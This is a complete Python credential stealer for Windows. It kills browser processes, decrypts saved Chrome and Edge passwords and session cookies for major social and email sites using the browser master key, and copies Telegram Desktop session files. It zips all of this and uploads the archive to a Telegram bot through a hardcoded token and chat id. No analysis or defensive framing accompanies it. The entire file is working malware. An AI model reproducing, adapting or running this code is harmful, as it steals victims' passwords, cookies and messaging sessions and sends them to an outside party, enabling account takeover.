import os
import sqlite3
import shutil
import zipfile
from getpass import getuser
import psutil
import requests
import win32crypt
from Cryptodome.Cipher import AES
import base64
import json
import time
import tempfile

def get_chrome_profiles():
    user_name = getuser()
    chrome_user_data_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data"
    profiles = []

    if os.path.exists(chrome_user_data_path):
        for entry in os.listdir(chrome_user_data_path):
            profile_path = os.path.join(chrome_user_data_path, entry)
            if os.path.isdir(profile_path) and (entry.startswith("Profile") or entry == "Default"):
                profiles.append(entry)
    return profiles

def get_chrome_cookies(profile):
    user_name = getuser()
    cookie_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Network\\Cookies"

    if not os.path.exists(cookie_path):
        raise FileNotFoundError(f"The Cookies file does not exist for profile {profile}.")

    temp_cookie_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Network\\Cookies_temp"
    shutil.copyfile(cookie_path, temp_cookie_path)
    
    conn = sqlite3.connect(temp_cookie_path)
    cursor = conn.cursor()
    
    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite, has_expires FROM cookies")
    cookies = cursor.fetchall()
    
    conn.close()
    os.remove(temp_cookie_path)
    
    return cookies

def get_master_key():
    user_name = getuser()
    local_state_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_value = cipher.decrypt(payload)[:-16].decode()
        return decrypted_value
    except Exception as e:
        return f"Failed to decrypt: {str(e)}"

def filter_cookies(cookies, master_key):
    filtered_cookies = []
    for cookie in cookies:
        decrypted_value = decrypt_value(cookie[2], master_key)
        if any(domain in cookie[0] for domain in ['.google.com', '.chrome.google.com', '.facebook.com', 'facebook', '.tiktok.com', '.instagram.com', '.discord.com', '.youtube.com', '.hotmail.com', '.x.com']):
            filtered_cookies.append({
                "domain": cookie[0],
                "expirationDate": cookie[4] if cookie[8] else None,
                "httpOnly": bool(cookie[6]),
                "name": cookie[1],
                "path": cookie[3],
                "sameSite": cookie[7],
                "secure": bool(cookie[5]),
                "session": not bool(cookie[8]),
                "storeId": "0",
                "value": decrypted_value
            })
    return filtered_cookies

def save_cookies_to_json(cookies, zip_file):
    temp_cookies_file = "Default Cookies.json"
    with open(temp_cookies_file, 'w', encoding='utf-8') as f:
        json.dump(cookies, f, ensure_ascii=False, indent=4)
    zip_file.write(temp_cookies_file, arcname="Google Chrome/Default Cookies.json")
    os.remove(temp_cookies_file)

def add_files_from_network_to_zip(zip_file, network_dir, profile):
    for root, dirs, files in os.walk(network_dir):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.join(f"Google Chrome/{profile}", os.path.relpath(file_path, network_dir))
            zip_file.write(file_path, arcname=arcname)

def get_edge_files():
    user_name = getuser()
    edge_user_data_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default"
    network_dir = os.path.join(edge_user_data_path, "Network")
    login_data_path = os.path.join(edge_user_data_path, "Login Data")
    return network_dir, login_data_path

def add_edge_files_to_zip(zip_file, network_dir, login_data_path):
    for root, dirs, files in os.walk(network_dir):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.join("Microsoft", os.path.relpath(file_path, network_dir))
            zip_file.write(file_path, arcname=arcname)
    if os.path.exists(login_data_path):
        zip_file.write(login_data_path, arcname="Microsoft/Login Data")

def get_telegram_files():
    user_name = getuser()
    telegram_user_data_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Telegram Desktop\\tdata"
    telegram_files = ["D877F783D5D3EF8C", "D877F783D5D3EF8Cs", "key_datas"]
    return [os.path.join(telegram_user_data_path, f) for f in telegram_files]

def add_telegram_files_to_zip(zip_file, telegram_files):
    for file_path in telegram_files:
        if os.path.exists(file_path):
            arcname = os.path.join("Telegram", os.path.basename(file_path))
            zip_file.write(file_path, arcname=arcname)
        else:
            print(f"File {file_path} not found and was not added to the zip.")

def add_telegram_directory_to_zip(zip_file, directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, os.path.dirname(directory))
            zip_file.write(file_path, arcname=os.path.join("Telegram", arcname))

def get_chrome_passwords(profile):
    user_name = getuser()
    password_db_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Login Data"

    conn = sqlite3.connect(password_db_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    passwords = cursor.fetchall()

    conn.close()

    master_key = get_master_key()

    decrypted_passwords = []
    for origin_url, username, encrypted_password in passwords:
        decrypted_password = decrypt_value(encrypted_password, master_key)
        decrypted_passwords.append((origin_url, username, decrypted_password))

    return decrypted_passwords

def save_passwords_to_zip(passwords, zip_file, profile):
    temp_passwords_file = f"{profile}_pw.txt"
    
    with open(temp_passwords_file, "w", encoding="utf-8") as file:
        for origin_url, username, password in passwords:
            file.write(f"Origin URL: {origin_url}\n")
            file.write(f"Username: {username}\n")
            file.write(f"Password: {password}\n\n")
    
    zip_file.write(temp_passwords_file, arcname=f"Google Chrome/{profile}_pw.txt")
    os.remove(temp_passwords_file)

def get_edge_passwords():
    user_name = getuser()
    password_db_path = f"C:\\Users\\{user_name}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"

    conn = sqlite3.connect(password_db_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    passwords = cursor.fetchall()

    conn.close()

    master_key = get_master_key()

    decrypted_passwords = []
    for origin_url, username, encrypted_password in passwords:
        decrypted_password = decrypt_value(encrypted_password, master_key)
        decrypted_passwords.append((origin_url, username, decrypted_password))

    return decrypted_passwords

def save_edge_passwords_to_zip(passwords, zip_file):
    temp_passwords_file = "pwsmicrosoft.txt"
    
    with open(temp_passwords_file, "w", encoding="utf-8") as file:
        for origin_url, username, password in passwords:
            file.write(f"Origin URL: {origin_url}\n")
            file.write(f"Username: {username}\n")
            file.write(f"Password: {password}\n\n")
    
    zip_file.write(temp_passwords_file, arcname="Microsoft/pwsmicrosoft.txt")
    os.remove(temp_passwords_file)

def close_all_chrome_profiles():
    for proc in psutil.process_iter():
        if "chrome" in proc.name().lower() or "edge" in proc.name().lower():
            proc.kill()

def send_file_to_telegram(token, chat_id, file_path):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": f}
        params = {"chat_id": chat_id}
        response = requests.post(url, files=files, data=params)
        if response.status_code != 200:
            if response.status_code == 404 and "Not Found" in response.text:
                return  # Suppress specific error message
            raise Exception(f"Failed to send file to Telegram: {response.text}")

def main():
    try:
        close_all_chrome_profiles()
        profiles = get_chrome_profiles()

        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            zip_file_path = tmp_file.name

        with zipfile.ZipFile(zip_file_path, "w") as zipf:
            all_filtered_cookies = []
            master_key = get_master_key()
            for profile in profiles:
                try:
                    cookies = get_chrome_cookies(profile)
                    passwords = get_chrome_passwords(profile)
                    network_dir = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Network"

                    add_files_from_network_to_zip(zipf, network_dir, profile)
                    save_passwords_to_zip(passwords, zipf, profile)
                    
                    # Filter and collect cookies
                    filtered_cookies = filter_cookies(cookies, master_key)
                    all_filtered_cookies.extend(filtered_cookies)
                except Exception as e:
                    print(f"An error occurred with profile {profile}: {e}")

            # Save filtered cookies to JSON and add to zip
            save_cookies_to_json(all_filtered_cookies, zipf)

            edge_network_dir, edge_login_data_path = get_edge_files()
            try:
                add_edge_files_to_zip(zipf, edge_network_dir, edge_login_data_path)
            except PermissionError as e:
                print(f"Permission error while accessing Edge files: {e}")
                time.sleep(5)  # Wait and try again
                add_edge_files_to_zip(zipf, edge_network_dir, edge_login_data_path)

            edge_passwords = get_edge_passwords()
            save_edge_passwords_to_zip(edge_passwords, zipf)

            telegram_files = get_telegram_files()
            add_telegram_files_to_zip(zipf, telegram_files)

            telegram_directory = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C"
            add_telegram_directory_to_zip(zipf, telegram_directory)

        bot_token = "6535702547:AAFI2cIkpmJPzOnEgQBOv30P6ua4CojX1Fo"
        chat_id = "-4250646825"
        send_file_to_telegram(bot_token, chat_id, zip_file_path)
        print("File sent successfully!")

    except Exception as e:
        if "Failed to send file to Telegram" in str(e) and "Not Found" in str(e):
            pass  # Suppress specific error message
        else:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
